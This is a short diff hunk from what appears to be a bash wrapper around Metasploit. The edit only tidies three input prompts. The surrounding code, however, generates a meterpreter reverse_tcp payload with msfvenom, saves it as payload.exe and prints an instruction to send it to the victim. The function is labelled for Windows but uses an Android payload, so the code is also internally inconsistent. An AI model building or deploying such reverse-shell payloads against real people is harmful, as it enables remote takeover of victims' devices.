@@ -53,9 +53,9 @@ function nmapscan() {
 #Function reverse shell with meterpreter for Windows
 function winrev() {
 	PAYLOAD="android/meterpreter/reverse_tcp"
-	read -p $'\e[1;92mInput your ip\e[0m \n' HOST
-	read -p $'\e[1;92mInput your port for forward\e[0m \n' PORT
-	read -p $'\e[1;92mInput the directory to save payload\e[0m \n'	DIR
+	read -p $'\e[1;92mInput your ip\e[0m' HOST
+	read -p $'\e[1;92mInput your port for forward\e[0m' PORT
+	read -p $'\e[1;92mInput the directory to save payload\e[0m'	DIR
 	msfvenom -p $PAYLOAD LHOST=$HOST LPORT=$PORT R> $DIR/payload.exe
 	printf "\e[1;31mSEND THE PAYLOAD TO THE VICTIM\e[0m \n"
 	#Activate listener for the winreverse payload
